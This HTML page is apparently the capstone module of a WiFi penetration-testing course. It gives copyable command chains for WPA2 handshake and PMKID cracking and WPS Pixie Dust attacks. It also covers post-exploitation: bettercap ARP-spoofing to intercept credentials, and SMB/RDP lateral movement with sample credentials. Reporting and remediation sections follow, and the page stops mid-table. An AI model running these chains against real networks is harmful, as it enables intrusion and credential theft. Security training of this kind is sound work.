<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Module 14 — Full Attack Chains & Automation | WiFi Exploitation Course</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --bg:#0d1117; --bg-card:#161b22; --bg-code:#010409; --border:#30363d;
      --accent:#58a6ff; --accent2:#3fb950; --accent3:#f78166; --warn:#d29922;
      --text:#c9d1d9; --text-dim:#8b949e; --text-head:#e6edf3;
      --radius:8px; --font-mono:'Cascadia Code','Fira Code','Consolas',monospace;
      --font-body:'Segoe UI',system-ui,sans-serif;
    }
    html { scroll-behavior: smooth; }
    body { background:var(--bg); color:var(--text); font-family:var(--font-body); line-height:1.7; font-size:15px; }
    .page-wrapper { display:flex; min-height:100vh; }

    aside.sidebar { width:260px; min-width:260px; background:var(--bg-card); border-right:1px solid var(--border); padding:24px 0; position:sticky; top:0; height:100vh; overflow-y:auto; }
    .sidebar-logo { padding:0 20px 24px; border-bottom:1px solid var(--border); }
    .sidebar-logo .course-title { font-size:11px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); margin-bottom:6px; }
    .sidebar-logo h2 { font-size:14px; color:var(--accent); font-weight:600; }
    .sidebar-nav { padding:16px 0; }
    .sidebar-section-label { font-size:10px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); padding:12px 20px 6px; }
    .sidebar-nav a { display:flex; align-items:center; gap:10px; padding:7px 20px; color:var(--text-dim); text-decoration:none; font-size:13px; transition:all 0.15s; border-left:2px solid transparent; }
    .sidebar-nav a:hover { color:var(--text); background:rgba(88,166,255,0.05); }
    .sidebar-nav a.active { color:var(--accent); border-left-color:var(--accent); background:rgba(88,166,255,0.08); }
    .sidebar-nav a .mod-num { font-size:10px; background:var(--border); border-radius:4px; padding:2px 6px; font-family:var(--font-mono); min-width:28px; text-align:center; }
    .sidebar-nav a.active .mod-num { background:rgba(88,166,255,0.2); color:var(--accent); }

    main { flex:1; padding:48px 64px; max-width:960px; }

    .module-header { margin-bottom:40px; }
    .breadcrumb { font-size:12px; color:var(--text-dim); margin-bottom:12px; }
    .breadcrumb a { color:var(--accent); text-decoration:none; }
    .module-badge { display:inline-flex; align-items:center; gap:8px; background:rgba(88,166,255,0.12); border:1px solid rgba(88,166,255,0.3); border-radius:20px; padding:4px 14px; font-size:12px; color:var(--accent); margin-bottom:16px; }
    .module-header h1 { font-size:2.2rem; color:var(--text-head); line-height:1.2; margin-bottom:12px; }
    .module-header .subtitle { font-size:16px; color:var(--text-dim); max-width:640px; }
    .meta-row { display:flex; gap:24px; margin-top:20px; flex-wrap:wrap; }
    .meta-pill { display:flex; align-items:center; gap:6px; font-size:12px; color:var(--text-dim); }
    .meta-pill .dot { width:8px; height:8px; border-radius:50%; }

    .warning-box { background:rgba(210,153,34,0.08); border:1px solid rgba(210,153,34,0.4); border-radius:var(--radius); padding:16px 20px; margin-bottom:36px; display:flex; gap:12px; }
    .warning-box p { font-size:13px; color:var(--warn); line-height:1.6; }
    .warning-box strong { color:#e3b341; }

    section { margin-bottom:52px; }
    section h2 { font-size:1.35rem; color:var(--text-head); margin-bottom:16px; padding-bottom:8px; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:10px; }
    section h2 .section-num { font-size:12px; color:var(--accent); font-family:var(--font-mono); background:rgba(88,166,255,0.1); border-radius:4px; padding:2px 8px; }
    section h3 { font-size:1.05rem; color:var(--text-head); margin:24px 0 10px; }
    p { margin-bottom:12px; }

    .terminal { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:16px 0; font-family:var(--font-mono); font-size:13px; }
    .terminal-bar { background:#161b22; border-bottom:1px solid var(--border); padding:8px 14px; display:flex; align-items:center; gap:10px; }
    .terminal-dots { display:flex; gap:6px; }
    .terminal-dots span { width:10px; height:10px; border-radius:50%; }
    .d-red{background:#f78166}.d-yellow{background:#e3b341}.d-green{background:#3fb950}
    .terminal-title { font-size:11px; color:var(--text-dim); }
    .terminal-copy { margin-left:auto; background:none; border:1px solid var(--border); border-radius:4px; padding:3px 10px; color:var(--text-dim); font-size:11px; cursor:pointer; font-family:var(--font-body); transition:all 0.15s; }
    .terminal-copy:hover { border-color:var(--accent); color:var(--accent); }
    .terminal-copy.copied { border-color:var(--accent2); color:var(--accent2); }
    .terminal-body { padding:16px 18px; overflow-x:auto; line-height:1.9; color:#c9d1d9; white-space:pre-wrap; }
    .prompt{color:var(--accent2);user-select:none} .cmd{color:#e6edf3} .flag{color:#ffa657}
    .str{color:#a5d6ff} .cmt{color:#6e7681;font-style:italic} .out{color:var(--text-dim)}
    .out-ok{color:var(--accent2)} .out-warn{color:var(--warn)} .out-err{color:var(--accent3)}

    .table-wrap { overflow-x:auto; margin:20px 0; border-radius:var(--radius); border:1px solid var(--border); }
    table { width:100%; border-collapse:collapse; font-size:13px; }
    thead tr { background:rgba(88,166,255,0.06); }
    th { padding:10px 14px; text-align:left; color:var(--accent); font-weight:600; font-size:11px; text-transform:uppercase; letter-spacing:0.8px; border-bottom:1px solid var(--border); }
    td { padding:10px 14px; border-bottom:1px solid rgba(48,54,61,0.6); vertical-align:top; }
    tr:last-child td { border-bottom:none; }
    tr:hover td { background:rgba(88,166,255,0.03); }
    code { font-family:var(--font-mono); font-size:12px; background:rgba(110,118,129,0.15); padding:2px 6px; border-radius:4px; color:#79c0ff; }

    .callout { border-radius:var(--radius); padding:14px 18px; margin:16px 0; display:flex; gap:12px; font-size:13px; line-height:1.6; }
    .callout.info  { background:rgba(88,166,255,0.07);  border-left:3px solid var(--accent); }
    .callout.attack{ background:rgba(247,129,102,0.07); border-left:3px solid var(--accent3); }
    .callout.tip   { background:rgba(63,185,80,0.07);   border-left:3px solid var(--accent2); }
    .callout.warn  { background:rgba(210,153,34,0.07);  border-left:3px solid var(--warn); }
    .callout .ci { flex-shrink:0; font-size:16px; }
    .callout strong { color:var(--text-head); }

    /* Chain cards */
    .chain-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(260px,1fr)); gap:16px; margin:20px 0; }
    .chain-card { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; cursor:pointer; transition:border-color 0.15s; }
    .chain-card:hover { border-color:var(--accent); }
    .chain-card.selected { border-color:var(--accent); background:rgba(88,166,255,0.05); }
    .chain-card .cc-num  { font-size:10px; color:var(--accent); font-family:var(--font-mono); text-transform:uppercase; letter-spacing:1px; margin-bottom:6px; }
    .chain-card .cc-title{ font-size:14px; color:var(--text-head); font-weight:600; margin-bottom:6px; }
    .chain-card .cc-desc { font-size:12px; color:var(--text-dim); margin-bottom:10px; }
    .chain-card .cc-tags { display:flex; flex-wrap:wrap; gap:6px; }
    .cc-tag { font-size:10px; padding:2px 8px; border-radius:10px; font-family:var(--font-mono); }
    .cc-tag.t-mod { background:rgba(88,166,255,0.1); color:var(--accent); }
    .cc-tag.t-tool{ background:rgba(63,185,80,0.1);  color:var(--accent2); }
    .cc-tag.t-time{ background:rgba(210,153,34,0.1); color:var(--warn); }

    /* Decision tree */
    .dtree { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:20px 24px; margin:20px 0; font-family:var(--font-mono); font-size:12px; line-height:2; }
    .dt-q  { color:var(--accent); }
    .dt-y  { color:var(--accent2); }
    .dt-n  { color:var(--text-dim); }
    .dt-a  { color:var(--accent3); font-weight:600; }
    .dt-indent { padding-left:20px; }
    .dt-indent2 { padding-left:40px; }

    /* Chain simulator */
    .chain-sim { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:24px; margin:20px 0; }
    .chain-sim h3 { font-size:14px; color:var(--text-head); margin-bottom:16px; }
    .sim-row { display:flex; gap:12px; flex-wrap:wrap; align-items:flex-end; margin-bottom:16px; }
    .sim-field { display:flex; flex-direction:column; gap:6px; }
    .sim-field label { font-size:11px; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.8px; }
    .sim-field select, .sim-field input { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:7px 12px; color:var(--text); font-size:13px; font-family:var(--font-body); outline:none; min-width:180px; }
    .sim-field select:focus, .sim-field input:focus { border-color:var(--accent); }
    .sim-btn { padding:8px 20px; background:var(--accent); border:none; border-radius:6px; color:#0d1117; font-weight:700; font-size:13px; cursor:pointer; font-family:var(--font-body); transition:all 0.2s; height:36px; align-self:flex-end; }
    .sim-btn:hover { background:#79c0ff; }
    .sim-btn:disabled { background:var(--border); color:var(--text-dim); cursor:default; }
    .sim-output { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); padding:16px; font-family:var(--font-mono); font-size:12px; line-height:1.9; min-height:260px; max-height:420px; overflow-y:auto; white-space:pre-wrap; }
    .sim-progress { margin-top:14px; display:none; }
    .sim-progress.show { display:block; }
    .sim-progress label { font-size:11px; color:var(--text-dim); display:flex; justify-content:space-between; margin-bottom:6px; }
    .progress-bar { background:var(--bg); border:1px solid var(--border); border-radius:4px; height:10px; overflow:hidden; }
    .progress-fill { height:100%; background:var(--accent); border-radius:4px; transition:width 0.4s ease; width:0%; }
    .result-box { margin-top:14px; background:rgba(63,185,80,0.08); border:1px solid var(--accent2); border-radius:var(--radius); padding:16px 20px; display:none; }
    .result-box.show { display:block; }
    .result-box .rb-title { color:var(--accent2); font-size:13px; margin-bottom:10px; font-weight:600; }
    .result-box .rb-item  { font-family:var(--font-mono); font-size:12px; margin-bottom:4px; }
    .result-box .rb-key   { color:var(--text-dim); }
    .result-box .rb-val   { color:var(--accent2); font-weight:700; }

    /* Completion banner */
    .completion-banner { background:linear-gradient(135deg, rgba(88,166,255,0.1), rgba(63,185,80,0.1)); border:1px solid rgba(88,166,255,0.4); border-radius:var(--radius); padding:32px; margin:40px 0; text-align:center; }
    .completion-banner h2 { font-size:1.8rem; color:var(--text-head); margin-bottom:12px; }
    .completion-banner p  { color:var(--text-dim); font-size:15px; max-width:500px; margin:0 auto; }
    .completion-badge { display:inline-flex; align-items:center; gap:10px; background:rgba(63,185,80,0.15); border:1px solid var(--accent2); border-radius:24px; padding:8px 20px; margin:20px auto; font-size:13px; color:var(--accent2); font-weight:600; }

    .nav-footer { display:flex; justify-content:space-between; align-items:center; padding:32px 0 0; border-top:1px solid var(--border); margin-top:48px; }
    .nav-btn { display:inline-flex; align-items:center; gap:8px; padding:10px 20px; border-radius:var(--radius); text-decoration:none; font-size:13px; font-weight:600; transition:all 0.2s; }
    .nav-btn.home { background:var(--accent); color:#0d1117; }
    .nav-btn.home:hover { background:#79c0ff; }
    .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
    .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }

    /* Quiz */
    .quiz-container { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:28px; margin:24px 0; }
    .quiz-container h3 { font-size:14px; color:var(--accent); margin-bottom:20px; display:flex; align-items:center; gap:8px; }
    .quiz-question { margin-bottom:28px; }
    .quiz-question .q-text { font-size:14px; color:var(--text-head); margin-bottom:14px; line-height:1.5; }
    .quiz-question .q-num { font-family:var(--font-mono); font-size:11px; color:var(--accent); margin-bottom:6px; }
    .option-list { display:flex; flex-direction:column; gap:8px; }
    .option-btn { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:10px 16px; color:var(--text); text-align:left; cursor:pointer; font-size:13px; transition:all 0.15s; font-family:var(--font-body); }
    .option-btn:hover { border-color:var(--accent); color:var(--text-head); }
    .option-btn.correct { border-color:var(--accent2); background:rgba(63,185,80,0.08); color:var(--accent2); }
    .option-btn.wrong { border-color:var(--accent3); background:rgba(247,129,102,0.08); color:var(--accent3); }
    .option-btn:disabled { cursor:default; }
    .quiz-feedback { margin-top:10px; font-size:13px; padding:10px 14px; border-radius:6px; display:none; line-height:1.5; }
    .quiz-feedback.show { display:block; }
    .quiz-feedback.correct-fb { background:rgba(63,185,80,0.08); border:1px solid rgba(63,185,80,0.3); color:var(--accent2); }
    .quiz-feedback.wrong-fb { background:rgba(247,129,102,0.08); border:1px solid rgba(247,129,102,0.3); color:var(--accent3); }
    .quiz-score { display:none; text-align:center; padding:20px; border-top:1px solid var(--border); margin-top:20px; }
    .quiz-score.show { display:block; }
    .score-num { font-size:3rem; font-weight:700; color:var(--accent); font-family:var(--font-mono); }
    .score-label { font-size:14px; color:var(--text-dim); margin-top:4px; }

    ::-webkit-scrollbar { width:6px; height:6px; }
    ::-webkit-scrollbar-track { background:var(--bg); }
    ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
    ::-webkit-scrollbar-thumb:hover { background:var(--text-dim); }

    @media (max-width:900px) { aside.sidebar { display:none; } main { padding:24px 20px; } }
  </style>
</head>
<body>
<div class="page-wrapper">

  <aside class="sidebar">
    <div class="sidebar-logo">
      <div class="course-title">WiFi Exploitation Course</div>
      <h2>Wireless Security</h2>
    </div>
    <nav class="sidebar-nav">
      <div class="sidebar-section-label">Tier 1 — Foundations</div>
      <a href="../module-00-foundations/"><span class="mod-num">00</span> 802.11 Foundations</a>
      <a href="../module-01-linux-wireless-setup/"><span class="mod-num">01</span> Linux Wireless Setup</a>
      <a href="../module-02-monitor-mode/"><span class="mod-num">02</span> Monitor Mode</a>
      <div class="sidebar-section-label">Tier 2 — Recon</div>
      <a href="../module-03-reconnaissance/"><span class="mod-num">03</span> Reconnaissance</a>
      <a href="../module-04-packet-analysis/"><span class="mod-num">04</span> Packet Analysis</a>
      <div class="sidebar-section-label">Tier 3 — Legacy</div>
      <a href="../module-05-wep-cracking/"><span class="mod-num">05</span> WEP Cracking</a>
      <div class="sidebar-section-label">Tier 4 — WPA2-Personal</div>
      <a href="../module-06-wpa2-handshake/"><span class="mod-num">06</span> WPA2 Handshake</a>
      <a href="../module-07-wpa2-cracking/"><span class="mod-num">07</span> WPA2 Cracking</a>
      <div class="sidebar-section-label">Tier 5 — Active Attacks</div>
      <a href="../module-08-deauth-dos/"><span class="mod-num">08</span> Deauth &amp; DoS</a>
      <div class="sidebar-section-label">Tier 6 — Rogue AP</div>
      <a href="../module-09-evil-twin/"><span class="mod-num">09</span> Evil Twin</a>
      <a href="../module-10-captive-portal/"><span class="mod-num">10</span> Captive Portal</a>
      <div class="sidebar-section-label">Tier 7 — WPS</div>
      <a href="../module-11-wps-attacks/"><span class="mod-num">11</span> WPS Attacks</a>
      <div class="sidebar-section-label">Tier 8 — Modern</div>
      <a href="../module-12-pmkid-attack/"><span class="mod-num">12</span> PMKID Attack</a>
      <a href="../module-13-enterprise-wpa/"><span class="mod-num">13</span> WPA-Enterprise</a>
      <div class="sidebar-section-label">Tier 9 — Chaining</div>
      <a href="#" class="active"><span class="mod-num">14</span> Attack Chaining</a>
    </nav>
  </aside>

  <main>
    <div class="module-header">
      <div class="breadcrumb"><a href="../">WiFi Exploitation Course</a> / Module 14</div>
      <div class="module-badge">&#9679; Tier 9 &mdash; Advanced Attack Chaining</div>
      <h1>Full Attack Chains &amp; Automation</h1>
      <p class="subtitle">Combine every module into complete end-to-end attack pipelines with Bash automation harnesses — from initial recon to credential access and post-exploitation.</p>
      <div class="meta-row">
        <div class="meta-pill"><span class="dot" style="background:#f78166"></span> Expert</div>
        <div class="meta-pill"><span class="dot" style="background:#58a6ff"></span> Final Module</div>
        <div class="meta-pill"><span class="dot" style="background:#3fb950"></span> All modules required</div>
      </div>
    </div>

    <div class="warning-box">
      <p><strong>Legal Notice:</strong> The chains in this module combine every attack technique in the course. They must only be executed on authorized targets. This module is the capstone of an ethical hacking curriculum — treat it accordingly.</p>
    </div>

    <!-- Section 1: Decision Tree -->
    <section id="decision">
      <h2><span class="section-num">01</span> Attack Selection Decision Tree</h2>
      <p>Before selecting an attack chain, fingerprint the target. Use this decision tree to choose the fastest, lowest-noise path.</p>

      <div class="dtree">
        <div><span class="dt-q">Target AP identified</span></div>
        <div class="dt-indent">├── <span class="dt-q">WPS enabled &amp; unlocked?</span> (wash)</div>
        <div class="dt-indent2">├── <span class="dt-y">Yes</span> → <span class="dt-a">Chain 4: Pixie Dust</span> (fastest — &lt;30s)</div>
        <div class="dt-indent2">└── <span class="dt-n">No</span> → continue</div>
        <div class="dt-indent">├── <span class="dt-q">WPA2-Enterprise (802.1X)?</span> (airodump AUTH column)</div>
        <div class="dt-indent2">└── <span class="dt-y">Yes</span> → <span class="dt-a">Chain 5: Rogue RADIUS</span></div>
        <div class="dt-indent">├── <span class="dt-q">Clients connected?</span></div>
        <div class="dt-indent2">├── <span class="dt-y">Yes</span> → <span class="dt-a">Chain 1: Deauth + Handshake</span></div>
        <div class="dt-indent2">└── <span class="dt-n">No</span>  → <span class="dt-a">Chain 2: PMKID (clientless)</span></div>
        <div class="dt-indent">└── <span class="dt-q">Want credentials beyond PSK?</span></div>
        <div class="dt-indent2">└── <span class="dt-y">Yes</span> → <span class="dt-a">Chain 3: Evil Twin + Portal</span></div>
      </div>

      <!-- Chain cards -->
      <div class="chain-grid" id="chainGrid">
        <div class="chain-card" onclick="selectChain(1)">
          <div class="cc-num">Chain 1</div>
          <div class="cc-title">Deauth → Handshake → Crack</div>
          <div class="cc-desc">Classic WPA2-PSK capture requiring connected clients</div>
          <div class="cc-tags">
            <span class="cc-tag t-mod">M03 M06 M07 M08</span>
            <span class="cc-tag t-tool">airodump aireplay hashcat</span>
            <span class="cc-tag t-time">4–10 hrs</span>
          </div>
        </div>
        <div class="chain-card" onclick="selectChain(2)">
          <div class="cc-num">Chain 2</div>
          <div class="cc-title">PMKID Clientless Crack</div>
          <div class="cc-desc">No clients needed — single association frame</div>
          <div class="cc-tags">
            <span class="cc-tag t-mod">M12</span>
            <span class="cc-tag t-tool">hcxdumptool hashcat</span>
            <span class="cc-tag t-time">4–10 hrs crack</span>
          </div>
        </div>
        <div class="chain-card" onclick="selectChain(3)">
          <div class="cc-num">Chain 3</div>
          <div class="cc-title">Evil Twin + Captive Portal</div>
          <div class="cc-desc">Social engineering for plaintext credential harvest</div>
          <div class="cc-tags">
            <span class="cc-tag t-mod">M08 M09 M10</span>
            <span class="cc-tag t-tool">hostapd dnsmasq nginx</span>
            <span class="cc-tag t-time">Real-time</span>
          </div>
        </div>
        <div class="chain-card" onclick="selectChain(4)">
          <div class="cc-num">Chain 4</div>
          <div class="cc-title">WPS Pixie Dust</div>
          <div class="cc-desc">Single exchange offline crack on vulnerable firmware</div>
          <div class="cc-tags">
            <span class="cc-tag t-mod">M11</span>
            <span class="cc-tag t-tool">wash reaver pixiewps</span>
            <span class="cc-tag t-time">&lt;30 seconds</span>
          </div>
        </div>
        <div class="chain-card" onclick="selectChain(5)">
          <div class="cc-num">Chain 5</div>
          <div class="cc-title">Enterprise Rogue RADIUS</div>
          <div class="cc-desc">Capture MSCHAPv2 + crack Active Directory credentials</div>
          <div class="cc-tags">
            <span class="cc-tag t-mod">M09 M13</span>
            <span class="cc-tag t-tool">hostapd-wpe asleap hashcat</span>
            <span class="cc-tag t-time">Real-time</span>
          </div>
        </div>
      </div>
    </section>

    <!-- Section 2: Key commands -->
    <section id="commands">
      <h2><span class="section-num">02</span> Key Automation Commands</h2>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">Chain 1 — Handshake capture + crack one-liner</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-chain1')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-chain1"><span class="cmt"># 1. Start monitor mode + capture</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airmon-ng start wlan0 && \
  sudo airodump-ng <span class="flag">--bssid</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-c</span> <span class="str">6</span> <span class="flag">-w</span> /tmp/cap wlan0mon &</span>

<span class="cmt"># 2. Deauth to force reconnection</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sleep 5 && sudo aireplay-ng <span class="flag">--deauth</span> <span class="str">10</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> wlan0mon</span>

<span class="cmt"># 3. Convert + crack</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">hcxpcapngtool <span class="flag">-o</span> /tmp/hashes.hc22000 /tmp/cap-01.cap && \
  hashcat <span class="flag">-m</span> <span class="str">22000</span> /tmp/hashes.hc22000 rockyou.txt <span class="flag">-r</span> rules/best64.rule</span></div>
      </div>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">Chain 2 — PMKID one-liner</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-chain2')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-chain2"><span class="prompt">kali@kali:~$ </span><span class="cmd">sudo systemctl stop NetworkManager && \
  sudo hcxdumptool <span class="flag">-i</span> wlan0 <span class="flag">-o</span> /tmp/pmkid.pcapng <span class="flag">--enable_status</span>=<span class="str">1</span> &
  sleep 60; kill %1
  hcxpcapngtool <span class="flag">-o</span> /tmp/pmkid.hc22000 /tmp/pmkid.pcapng && \
  hashcat <span class="flag">-m</span> <span class="str">22000</span> /tmp/pmkid.hc22000 rockyou.txt && \
  sudo systemctl start NetworkManager</span></div>
      </div>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">Chain 4 — WPS Pixie Dust one-liner</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-chain4')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-chain4"><span class="cmt"># Scan for WPS targets then Pixie Dust the best candidate</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airmon-ng start wlan0 && \
  sudo wash <span class="flag">-i</span> wlan0mon <span class="flag">-c</span> <span class="str">6</span> 2>/dev/null</span>

<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo reaver <span class="flag">-i</span> wlan0mon <span class="flag">-b</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-c</span> <span class="str">6</span> <span class="flag">-K</span> <span class="str">1</span> <span class="flag">-vv</span></span>
<span class="out-ok">[Pixie-Dust] WPS PIN found: 12345678</span>
<span class="out-ok">[+] WPA PSK: 'MyNetworkPass!'</span></div>
      </div>
    </section>

    <!-- Section 3: Full chain simulator -->
    <section id="simulator">
      <h2><span class="section-num">03</span> Attack Chain Simulator</h2>
      <p>Simulate any complete attack chain end-to-end. Select a chain and watch each phase execute.</p>

      <div class="chain-sim">
        <h3>&#9889; Attack Chain Simulator</h3>
        <div class="sim-row">
          <div class="sim-field">
            <label>Attack Chain</label>
            <select id="chainSelect">
              <option value="1">Chain 1 — Deauth + Handshake + Crack</option>
              <option value="2">Chain 2 — PMKID Clientless</option>
              <option value="3">Chain 3 — Evil Twin + Portal</option>
              <option value="4">Chain 4 — WPS Pixie Dust</option>
              <option value="5">Chain 5 — Enterprise Rogue RADIUS</option>
            </select>
          </div>
          <div class="sim-field">
            <label>Target SSID</label>
            <input type="text" id="simSSID" value="TargetNetwork" />
          </div>
          <button class="sim-btn" id="simBtn" onclick="runChain()">&#9654; Execute Chain</button>
        </div>
        <div class="sim-output" id="chainOutput"><span style="color:var(--text-dim);">Select an attack chain and click "Execute Chain" to simulate the full pipeline...</span></div>
        <div class="sim-progress" id="simProg">
          <label><span id="progLabel">Progress</span><span id="progPct">0%</span></label>
          <div class="progress-bar"><div class="progress-fill" id="progFill"></div></div>
        </div>
        <div class="result-box" id="resultBox">
          <div class="rb-title">&#10003; Chain Complete — Objective Achieved</div>
          <div id="resultItems"></div>
        </div>
      </div>
    </section>

    <!-- Section 4: Post-Exploitation -->
    <section id="postexploit">
      <h2><span class="section-num">04</span> Post-Exploitation</h2>
      <p>
        Gaining Wi-Fi access is not the end of the engagement. Post-exploitation determines the actual business impact
        and provides evidence for the pentest report.
      </p>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">Network mapping + MITM after gaining PSK access</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-postexploit')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-postexploit"><span class="cmt"># After connecting with cracked PSK — map the internal network</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo nmap <span class="flag">-sn</span> 192.168.1.0/24</span>
<span class="out-ok">Host: 192.168.1.1   (gateway/router)</span>
<span class="out-ok">Host: 192.168.1.50  (Windows workstation)</span>
<span class="out-ok">Host: 192.168.1.100 (IoT device)</span>

<span class="cmt"># Full port scan + service detection on interesting hosts</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo nmap <span class="flag">-sV</span> <span class="flag">-sC</span> <span class="flag">-p-</span> 192.168.1.50 <span class="flag">-oN</span> /tmp/scan.txt</span>

<span class="cmt"># ARP MITM with bettercap — intercept all victim traffic</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo bettercap <span class="flag">-iface</span> wlan0</span>
<span class="out">bettercap&gt; </span><span class="cmd">set arp.spoof.targets 192.168.1.50</span>
<span class="out">bettercap&gt; </span><span class="cmd">arp.spoof on</span>       <span class="cmt"># Position between victim and gateway</span>
<span class="out">bettercap&gt; </span><span class="cmd">net.sniff on</span>      <span class="cmt"># Capture all plaintext traffic</span>
<span class="out">bettercap&gt; </span><span class="cmd">http.proxy on</span>     <span class="cmt"># HTTP proxy for credential interception</span>
<span class="out">bettercap&gt; </span><span class="cmd">events.show</span>       <span class="cmt"># View captured credentials in real time</span>

<span class="cmt"># If enterprise creds captured (Chain 5) — try lateral movement via SMB</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">smbclient <span class="flag">-L</span> //192.168.1.50 <span class="flag">-U</span> <span class="str">"CORP\\alice%Summer2024!"</span></span>
<span class="out-ok">Sharename    Type    Comment</span>
<span class="out-ok">---------    ----    -------</span>
<span class="out-ok">C$           Disk    Default share</span>
<span class="out-ok">ADMIN$       Disk    Remote Admin</span>
<span class="out-warn">IT_Files     Disk    Internal IT share ← lateral movement target</span>

<span class="cmt"># Or connect to internal RDP</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">xfreerdp /v:192.168.1.50 /u:alice /p:Summer2024! /d:CORP</span></div>
      </div>

      <div class="callout attack">
        <span class="ci">&#9889;</span>
        <div><strong>Chain 5 operational value:</strong> Captured MSCHAPv2 → cracked AD password. That single credential is valid for email, VPN, SharePoint, SMB shares, and RDP — far beyond just Wi-Fi access. This is why WPA2-Enterprise attacks are the highest-value wireless engagements.</div>
      </div>
    </section>

    <!-- Section 5: Reporting -->
    <section id="reporting">
      <h2><span class="section-num">05</span> Reporting &amp; Remediation</h2>
      <p>Every wireless pentest ends with a report. The quality of findings documentation determines whether clients actually fix the vulnerabilities.</p>

      <div class="terminal">
        <div class="terminal-bar">
          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
          <span class="terminal-title">Evidence collection commands for report</span>
          <button class="terminal-copy" onclick="copyTerm(this,'copy-report')">Copy</button>
        </div>
        <div class="terminal-body" id="copy-report"><span class="cmt"># Save airodump-ng scan results for report appendix</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airodump-ng <span class="flag">--wps</span> <span class="flag">--manufacturer</span> <span class="flag">-w</span> /tmp/evidence/recon <span class="flag">--output-format</span> <span class="str">csv,pcap</span> wlan0mon</span>

<span class="cmt"># Capture screen evidence of cracked PSK</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">hashcat <span class="flag">-m</span> <span class="str">22000</span> hashes.hc22000 <span class="flag">--show</span> | tee /tmp/evidence/cracked_passwords.txt</span>

<span class="cmt"># Document WPS vulnerability</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo wash <span class="flag">-i</span> wlan0mon <span class="flag">-s</span> 2>/dev/null | tee /tmp/evidence/wps_scan.txt</span>

<span class="cmt"># Verify PMKID exposure (informational finding)</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">hcxpcapngtool <span class="flag">--info</span> capture.pcapng | tee /tmp/evidence/pmkid_info.txt</span>

<span class="cmt"># Generate network map for report</span>
<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo nmap <span class="flag">-sV</span> <span class="flag">--top-ports</span> <span class="str">100</span> 192.168.1.0/24 <span class="flag">-oX</span> /tmp/evidence/network_map.xml</span></div>
      </div>

      <div class="table-wrap">
        <table>
          <thead><tr><th>Finding</th><th>CVSS</th><th>Severity</th><th>Chains</th><th>Fix</th></tr></thead>
          <tbody>
            <tr><td>WPS enabled (vulnerable firmware)</td><td>9.8</td><td style="color:var(--accent3)">Critical</td><td>Chain 4</td><td>Disable WPS entirely</td></tr>
            <tr><td>Weak WPA2-PSK cracked</td><td>8.1</td><td style="color:var(--accent3)">Critical</td><td>Chain 1, 2</td><td>20+ char random PSK or WPA3</td></tr>
            <tr><td>PEAP without cert validation</td><td>8.8</td><td style="color:var(--accent3)">Critical</td><td>Chain 5</td><td>Pin RADIUS CA + CN on all supplicants</td></tr>
            <tr><td>WPA3 transition mode</td><td>6.5</td><td style="color:var(--warn)">High</td><td>Chain 1, 2</td><td>WPA3-only mode</td></tr>
            <tr><td>No 802.11w (MFP)</td><td>6.5</td><td style="color:var(--warn)">High</td><td>Chain 1, 3</td><td>Enable mandatory MFP</td></tr>
            <tr><td>Open AP present</td><td>7.5</td><td style="color:var(--warn)">High</td><td>Chain 3</td><td>Remove or replace with WPA3</td></tr>
